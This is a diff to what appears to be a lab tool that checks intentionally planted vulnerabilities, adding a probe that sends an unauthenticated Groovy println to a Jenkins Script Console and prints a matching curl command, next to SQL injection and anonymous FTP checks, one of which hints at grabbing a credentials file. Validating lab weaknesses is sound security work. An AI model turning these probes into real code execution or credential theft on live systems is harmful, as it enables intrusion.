@@ -450,6 +450,23 @@ def run_live_validation(rows: list[dict], manifest: dict, lab_dir: Path) -> tupl
                     row.update(applied="NO", exploitable="NO", evidence=evidence)
                 else:
                     row.update(applied="PENDING", exploitable="PENDING", evidence=evidence)
+        elif vid == "jenkins-unauth-script-console":
+            # POST a benign Groovy println to the (now anonymous) Script Console.
+            target_ip = host.get("ip")
+            if not target_ip:
+                row.update(
+                    applied="PENDING",
+                    exploitable="PENDING",
+                    evidence=f"no IP for host {r['run_on']!r} in the manifest.",
+                )
+            else:
+                ok, evidence = _jenkins_script_probe(target_ip)
+                if ok is True:
+                    row.update(applied="YES", exploitable="YES", evidence=evidence)
+                elif ok is False:
+                    row.update(applied="NO", exploitable="NO", evidence=evidence)
+                else:
+                    row.update(applied="PENDING", exploitable="PENDING", evidence=evidence)
         elif vid in ("ftp-anonymous-access", "ftp-write-webroot"):
             # Anonymous FTP checks over the tunnel (ftplib). ftp-anonymous-access:
             # anon login succeeds. ftp-write-webroot: anon STOR + HTTP GET-back.
@@ -722,6 +739,34 @@ def _webapp_sqli_probe(host_ip: str) -> tuple[bool | None, str]:
     return False, f"{url} responded but the injected UNION did not execute — app absent or queries parameterized (webapp_sql_parameterization may have neutralized it)."
 
 
+JENKINS_MARKER = "PF-JENKINS-OK"
+
+
+def _jenkins_script_probe(host_ip: str) -> tuple[bool | None, str]:
+    """Confirm the unauthenticated Jenkins Script Console: POST a benign Groovy
+    `println` to /scriptText with no credentials. The marker back proves BOTH
+    applied (security disabled) AND exploitable (anonymous RCE). The payload only
+    prints — safe. Returns (True/False/None, evidence)."""
+    curl = shutil.which("curl")
+    if not curl:
+        return None, "curl not on PATH — install it to auto-validate; command left for you below."
+    url = f"http://{host_ip}:8080/scriptText"
+    try:
+        r = subprocess.run(
+            [curl, "-s", "-m", "20", "--data-urlencode", f"script=println '{JENKINS_MARKER}'", url],
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+    except (subprocess.TimeoutExpired, OSError):
+        return None, f"POST to {url} did not complete (timeout/unreachable) — retry the command below."
+    if r.returncode != 0:
+        return None, f"could not reach {url} (curl rc={r.returncode}) — retry the command below."
+    if JENKINS_MARKER in (r.stdout or ""):
+        return True, f"unauthenticated Groovy on {url} echoed {JENKINS_MARKER} — anonymous Script Console RCE confirmed."
+    return False, f"{url} did not run the unauthenticated script — auth/authorization is enforced (gap not applied or neutralized)."
+
+
 def _nxc_run(cmd: list[str]) -> str | None:
     """Run an nxc/netexec command, returning combined stdout+stderr, or None if it
     could not run at all (never raises — a live check failing is data, not a crash)."""
@@ -821,6 +866,11 @@ def _live_command(
         ip = target_ip or "<host-ip>"
         args = " ".join(f"--data-urlencode \"{k}={v}\"" for k, v in params.items())
         return f"curl -s -G {args} http://{ip}/{path}  # response contains '{marker}' = vuln works"
+    if vid == "jenkins-unauth-script-console":
+        return (
+            f"curl -s --data-urlencode \"script=println '{JENKINS_MARKER}'\" "
+            f"http://{target_ip or '<host-ip>'}:8080/scriptText  # prints {JENKINS_MARKER} unauthenticated = RCE"
+        )
     if vid == "ftp-anonymous-access":
         return f"nxc ftp {target_ip or '<host-ip>'} -u anonymous -p ''  # anonymous login succeeds + lists the root (grab backup_creds.txt)"
     if vid == "ftp-write-webroot":
